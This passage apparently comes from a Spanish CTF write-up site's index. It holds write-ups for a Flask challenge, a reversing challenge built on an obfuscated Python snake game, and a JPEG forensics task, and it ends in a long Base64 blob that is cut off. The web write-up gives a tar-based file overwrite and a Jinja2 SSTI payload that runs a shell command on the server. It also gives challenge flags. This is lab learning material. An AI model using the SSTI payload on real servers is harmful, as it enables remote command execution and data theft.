Add application COPY challenge .  La idea es sobrescribir index.html, por lo que vamos a poner un mensaje sencillo para ver si funciona. Después comprimimos el archivo como antes. Finalmente, subimos el archivo y refrescamos la página:\nPerfecto, podemos escribir archivos. Ahora, para conseguir la flag (que está almacenada en un archivo), podemos utilizar Server-Side Template Injection (SSTI), ya que se está utilizando Flask.\nPor ejemplo, podemos poner este payload en index.html:\n{{ cycler.__init__.__globals__.os.popen('cat /app/flag').read() }}  Después de comprimir el archivo, subirlo y refrescar la página vemos:\nPerfecto. Ahora vamos a subir el archivo firmware.tar.gz a la instancia en línea:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/slippy/","section":"ctf","summary":"Navegación de directorios con TAR. Server-Side Template Injection","time":1,"title":"Slippy"},{"contents":"Se nos proporciona un binario llamado chall.pyc, por lo que sabemos que es un binario compilado mediante Python:\n$ file chall.pyc chall.pyc: python 2.7 byte-compiled  En primer lugar, podemos extraer el código fuente en Python usando uncompyle6. Como está compilado con python2.7, podemos emplear un contenedor de Docker para ello:\n$ docker run -v \"$PWD\":/ctf -it python:2.7 bash root@11d1f884672f:~# cd /ctf root@11d1f884672f:/ctf# pip install uncompyle6 DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support Collecting uncompyle6 Downloading uncompyle6-3.8.0-py2-none-any.whl (317 kB) |████████████████████████████████| 317 kB 3.6 MB/s Collecting spark-parser\u0026lt;1.9.0,\u0026gt;=1.8.9 Downloading spark_parser-1.8.9-py2-none-any.whl (17 kB) Collecting xdis\u0026lt;6.1.0,\u0026gt;=6.0.2 Downloading xdis-6.0.3-py2-none-any.whl (137 kB) |████████████████████████████████| 137 kB 9.8 MB/s Collecting click Downloading click-7.1.2-py2.py3-none-any.whl (82 kB) |████████████████████████████████| 82 kB 1.5 MB/s Installing collected packages: click, spark-parser, xdis, uncompyle6 Successfully installed click-7.1.2 spark-parser-1.8.9 uncompyle6-3.8.0 xdis-6.0.3 WARNING: You are using pip version 20.0.2; however, version 20.3.4 is available. You should consider upgrading via the '/usr/local/bin/python -m pip install --upgrade pip' command. root@11d1f884672f:/ctf# uncompyle6 chall.pyc \u0026gt; chall.py root@11d1f884672f:/ctf# cat chall.py  # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Apr 21 2020, 09:53:40) # [GCC 8.3.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-17 22:16:46 import marshal, types, time ll = types.FunctionType(marshal.loads(('YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB\\nAIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl\\nc3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK\\nAAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA\\ncwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA\\n').decode('base64')), globals()) i0 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB\\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh\\n') i1 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB\\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1\\n') f0 = ll('eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz\\n8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5\\n') f1 = ll('eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp\\nLknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw==\\n') f2 = ll('eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm\\n1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn\\ngCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu\\nJby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA==\\n') f3 = ll('eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj\\nII4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O\\nT/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1\\nap6X4g8LaaoZ3zFGfzFVE/UBTuovhA==\\n') f4 = ll('eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV\\nW3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8=\\n') f5 = ll('eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG\\nBhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j\\nycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM\\n') f6 = ll('eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17\\nRQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2\\nDD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p\\n') f7 = ll('eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd\\nWPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7\\nabb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV\\n6Zn+Azn/L1k=\\n') f8 = ll('eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI\\nwkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7\\nPxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj\\nL3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X\\n') a1 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALI0C1U=\\n') a2 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALBMC00=\\n') a3 = ll('eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A\\niUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm\\nR4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X\\ngdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U=\\n') a4 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBALCJC04=\\n') a5 = ll('eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH\\nalAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99\\nnt6PMA26l/SKxQ/XGxky\\n') a6 = ll('eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T\\nDMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN\\nxxM9\\n') a7 = ll('eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p\\njiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM\\nqhM6\\n') a8 = ll('eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd\\nSNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q==\\n') a9 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\\nm5SSaAdWDFIBAK+VC0o=\\n') m0 = ll('eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8\\nDsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu\\n+F5V/Bw1Wpl0B7cCYGsZOw==\\n') m1 = ll('eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm\\nqAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi\\n/HOMRIklkJ38AF2QGOk=\\n') m2 = ll('eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM\\nQXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6\\ny8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw=\\n') def snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return i1().wrapper(snake) # okay decompiling chall.pyc  Vale, está un poco ofuscado con marshal\u0026hellip; Vamos a ejecutar el script a ver qué tenemos:\nroot@11d1f884672f:/ctf# python chall.py  ++++++++++ + + + + + $+ + + + + + # + + + + + ++++++++++  Se trata de un juego del Snake, donde la serpiente es el # y las manzanas son los $. Si jugamos un rato, vemos que el $ cambia después de algún tiempo a T, luego a B, luego a {\u0026hellip; Pero eventualmente la serpiente será tan larga que no podremos seguir jugando:\n++++++++++ + + + + + T # + + # + + # + + # + + # + + + ++++++++++  ++++++++++ + ## + + # + + # + + # + + # + + # + + # + + ## B+ ++++++++++  ++++++++++ +### + +# + +# { + +# + +# + +# + +####### + + + ++++++++++  Pero la flag está ahí, en las manzanas. Mirando de nuevo a la función principal, vemos que hay algunas variables que podemos analizar:\ndef snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return  Estas variables tienen que ser parámetros usados por el juego para poder jugar. Para saber qué variable es qué valor (posición, serpiente, posición de la manzana, puntuación\u0026hellip;), podemos utilizar un archivo para guardar los valores de las variables en cada movimiento:\ndef snake(w): with open('log.txt', 'a') as fd: r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: fd.write('p = %s; d = %s, pl = %s; l = %s; s = %s; w = %s; c = %s; r = %s\\n' % (p, d, pl, l, s, w, c, r)) p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) time.sleep(0.4) return  Ahora podemos jugar un poco y mirar el archivo de log:\nroot@11d1f884672f:/ctf# tail log.txt p = [(5, 4), (4, 4), (3, 4), (2, 4), (1, 4)]; d = (-1, 0), pl = 5; l = None; s = 37; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(4, 4), (3, 4), (2, 4), (1, 4), (8, 4)]; d = (-1, 0), pl = 5; l = None; s = 38; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(3, 4), (2, 4), (1, 4), (8, 4), (7, 4)]; d = (-1, 0), pl = 5; l = None; s = 39; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(2, 4), (1, 4), (8, 4), (7, 4), (6, 4)]; d = (-1, 0), pl = 5; l = None; s = 40; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(1, 4), (8, 4), (7, 4), (6, 4), (5, 4)]; d = (-1, 0), pl = 5; l = (6, 5); s = 41; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(8, 4), (7, 4), (6, 4), (5, 4), (5, 5)]; d = (0, 1), pl = 5; l = (6, 5); s = 42; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(7, 4), (6, 4), (5, 4), (5, 5), (6, 5)]; d = (1, 0), pl = 6; l = None; s = 43; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(7, 4), (6, 4), (5, 4), (5, 5), (6, 5), (7, 5)]; d = (1, 0), pl = 6; l = None; s = 44; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(6, 4), (5, 4), (5, 5), (6, 5), (7, 5), (8, 5)]; d = (1, 0), pl = 6; l = None; s = 45; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt; p = [(5, 4), (5, 5), (6, 5), (7, 5), (8, 5), (1, 5)]; d = (1, 0), pl = 6; l = None; s = 46; w = \u0026lt;_curses.curses window object at 0xffff8d53f5d0; c = \u0026lt;module 'curses' from '/usr/local/lib/python2.7/curses/__init__.pyc'\u0026gt;; r = \u0026lt;module 'random' from '/usr/local/lib/python2.7/random.pyc'\u0026gt;  Podemos deducir que p son las coordenadas de cada # de la serpiente y pl es la puntuación que tenemos (que equivale a la longitud de la serpiente). d parece la dirección de la serpiente (arriba, derecha, abajo, izquierda), y s es el número de movimientos desde el inicio. Luego w, c y r son objetos curses para renderizar el mapa.\nEs posible que hay más formas de obtener la flag. Yo decidí trucar el juego para que aumente la puntuación en uno den cada movimiento y fijar la variable p a una coordenada fija, de manerq que puedo ver la manzana cambiando de $ a un carácter de la flag sin preocuparme de la serpiente. Luego, solo hay que tomar nota de los caracteres y listo:\ndef snake(w): r = i0() c = i1() f0(w) d = (0, 1) p = [(5, 5)] pl = 1 s = 0 l = None while 1: p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r) pl += 1 p = [(5, 5)] time.sleep(0.4) return  Este es un GIF que muestra el juego trucado:\nY la flag es HTB{SuP3r_S3CRt_Sn4k3c0d3}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/snakecode/","section":"ctf","summary":"Extracción de script en Python. Análisis dinñamico. Modificación de juego","time":5,"title":"Snakecode"},{"contents":"Se nos pide encontrar la flag en esta imagen:\nSin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en su contenido en crudo.\nPara extraer los caracteres imprimibles de la imagen podemos utilizar strings y ver los primeros valores con head:\n$ strings snowboard.jpg | head JFIF CTFlearn{CTFIsEasy!!!} Q1RGbGVhcm57U2tpQmFuZmZ9Cg== Exif Canon Canon EOS 6D Mark II GIMP 2.10.6 2019:05:07 14:37:21 0230 2018:08:23 12:52:08  Vemos que aparece una flag: CTFlearn{CTFIsEasy!!!}, pero no es correcta.\nJusto debajo hay una cadena en Base64 que se decodifica como otra flag:\n$ echo Q1RGbGVhcm57U2tpQmFuZmZ9Cg== | base64 -d CTFlearn{SkiBanff}  Y esta sí que es correcta.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/snowboard/","section":"ctf","summary":"Caracteres imprimibles en archivos. Codificación Base64","time":0,"title":"Snowboard"},{"contents":"Se nos proporciona este archivo enorme:\nVm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRWxhU0hCSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXY1ZGVVJsTk5WbFkxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STlNHaFBVbTE0VjFSVmFHOVhSMHB5VGxac1dtSkdXbWhaTW5oWFkxWkdWVkpzVGs1V2JGa3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSGFGQlZiVEUwVmpGU1ZtRkhPVmhTTUhCNVZHeGFjMWR0U2tkWGJXaGFUVzVvV0ZreFdrZFdWa3B6VkdzMVYySkdhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWV3hrTkdGR1ZYZGhSVTVVVW14d2VGVnRNVWRWTWtwV1lrUmFXR0V4Y0hKWlZXUkdaVWRPU0U5V1pHaGhNSEJ2Vm10U1MxUXlVa2RUYmtwb1VqSm9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZZeVNrZGhNMmhYWVRGd2FGWlVSbFpsUm1SMVUyczFXRkpZUW5oV1YzaHJUa2RHUjFaWVpHaFNWVFZWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYxcEhhR2hOU0VKMlZtMTBVMU14VVhsVmEyUlVZbXR3YjFWcVNtOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0VDFOSFJrZFJiRnBwVmtWVmQxWnRjRWRWTVZwMFVtdG9VRlp0YUZSVVZXaERUbFphU0dWSFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmVWTnJaR2hOTW1oWVdWUkdkMkZHV2xWU2JGcHNVbTFTTVZVeWN6RlhSa3BaVVc1b1YxWXphSEpVYTJSSFVqRmFXVnBIYUZOV1ZGWldWbGN4TkdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsVlpiWFIzWWpGV2NWTnRPVmRTYlhoYVdUQmFhMkpIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFZERk9TRkpyWkZKaVJuQndWbXRXVm1ReFduUmpSV1JXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVWJGcGhVMGRXU0ZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubFhhMXByVmpKRmVsRnFXbGRoTWxJMlZGWmFXbVZXVG5KYVIyaE9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xkV2JHTjRUa2RSZVZaclpGZGliRXBQVm14a1UxWXhVbGhrU0dSWFRWZDRlVlpYTVVkWFJrbDNWbXBTV2sxSGFFeFdNbmhoVjBaV2NscEhSbGRXTVVwUlZsUkNWazVXV1hoalJXaG9VakpvVDFVd1ZrdE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZtMUZlVlZzVmxwaVdGSXpXV3BHVjJOV1RuUlBWbVJUWWxob1lWZFVRbUZoTWtwSVUydG9WbUpIZUdoV2JHUk9UVlpzVjFaWWFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRlpFUms5VFJrcHlXa1pLYVZKdVFuZFdiWFJYVm0xUmVGZHVVbXBTVjFKWFZGWmFkMDFHVm5Sa1J6bFdVbXh3TUZsVldsTldWbHBZWVVWU1ZXSkdjR2hWTUdSWFUwWktkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMVkwWmthMkpHYkROV01qVkxZa1pLZEZWdWJGaGhNWEJ5Vm1wS1JtVnNSbkZYYkdSb1RXeEpNbFpHV21GWGJWWlhWRzVLWVZJeWFFOVVWekZ2VjFaa1YxVnJaR3ROYTFwSVZqSjRWMVV5U2tkalNFNVdZbFJHVkZSV1dsWmxWMDQyVW14b1UyRXpRbUZXVm1NeFlqRlplRmRZY0doVFJYQldXVlJLVTFOR1ZuRlNiVVpZVm01Q1NWbFZXazlXTVZwSFYyeGtWMkpIVGpSVWEyUlNaVlphY2xwR1pHbGlSWEJRVm0xNGExVXhXWGhWYkdoclUwZFNXRlJXWkRSbFZscFlUVlZrV0ZKcmJETldiWEJUVjJzeFNHRkZlRmROYm1ob1ZqQmFWMk5zY0VoU2JHUlhUVlZ3VWxac1VrTldhelZYVjFob2FsSlhhRzlWYWtwdlZERlZkMVpyZEU1aVJuQXdWRlpTUTFack1WWk5WRkpYVm0xb2VsWnRNVVpsVmxaelZteHdhVmRHU1hwWFYzQkhWakpPVjFSdVVsQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbHBGVW1zNVZGSnJjSGxYYTFwTFlWWktkVkZ1WkZkaVdGSllWbTB4VW1WR1pIVlZiWEJUVmpGS1dGWkdXbUZrTURGSFZtNVNhMUo2YkZkVmJYaDNUVVpzVmxkc1RsZFdiSEJaV1ZWV1UxWlhTa2RqUjJoV1RVZFNXRlV3V2t0a1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p3TVZrd1dtdGhNa3BIWWtST1YwMXFWa3haYTFwTFpFWldkV0pHYUdoTldFSjVWbTF3UzFKdFZuTlNia1pZWWtkU2IxUlhlRXBOYkZwSFYyMUdXR0pXV2xoV1J6VkxXVlpKZVdGRk9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRiMVV5UlhwUmJVWlhWbTFOZUZscVJscGxSbVJaWTBkb1ZGSllRbGRYVmxKTFZURk9SMVp1UmxOaVZWcFpWbTAxUTFOV2JGWlhhemxYVFZad1NGWXllR3RXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwSGJHbFNXRUpSVm0weE5HRXhWWGhYV0doV1lrZG9jbFV3WkZOWFJsSlhXa1JTYkZac2NGbFVWbFpyVjBaS2NtSkVUbGRpV0VKVVZqSnplRk5IUmtabFJtUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVGxkaGVsWllWakZvYjJGc1NsaGhSemxXWVd0d2RsWkVSbFprTVZweVpFVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm0weGIyVnNXblJOVlZwc1ZteGFlbFp0ZUhkaFZtUkhVMWh3V0ZZelFraFdha3BQVmpGU2RWVnNRbGRpVmtwVlYxZDRiMkl4YkZkYVJsWlNZbFZhYjFSWGRIZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJrZGhSazVwVW01Qk1WWXhXbGRaVjBWNFZXNVNVMkpyTlZsWmExcGhWMFpzVlZOc1NrNVNiSEJHVlcxek5WWkdTbkpqU0d4WVlURndURmxXV2t0a1ZrWjFXa1prYVZkR1NsbFdiVEI0VlcxV1IxcElWbFppV0VKVVZtcEdTMWRHV2tkWGJVWnJUVVJHU0ZadE5WTmhNVW8yWWtaa1ZtSllhRE5VVlZwelZteGtjMVJzWkZkaVNFSmFWMVpXVjFVeFdsaFRhMlJxVWpKb1YxUlZaRk5YUmxWM1YydDBhMUl3TlVkVWJGcHJWR3hhV0dRemNGZGlXR2hVVlhwQmVGTkdTbGxoUjBaVFZqSm9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaWldsVmFhMVl3TVhGV2JrcFhWa1Z3VEZVeFdrZGpiVVpIV2taT1RrMXRhRlpXYlhoVFV6RktkRlp1VGxOaWExcFlXV3RrVTFaR1VsVlRiVGxwVFZad2VWWlhkREJWTURGWFlrUlNWMUo2VmxoV2JURkxVbXhPYzJGR1dtbFNhM0JaVm1wR1lWbFdTWGhpUkZwVFlsZDRUMVpxUmt0VFZsbDVaRWRHYUUxWFVrbFZNblJoWVd4T1JrNVdaRnBpUmtwSVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGT1pVWnNjVkpzY0d4U2JWSmFXVEJrYjFaR1NsbFJiR3hYWWxoU1dGZFdaRmRqTVdSMVVteE9hVkl4U25oV1JscHJWVEpXYzJKR1dtRlRSVFZZVkZaYWQwMVdWbGhsUldSWFRXdFdORmt3Wkc5WFJscDBWV3hPWVZac2NHaFpNbmgzVWpG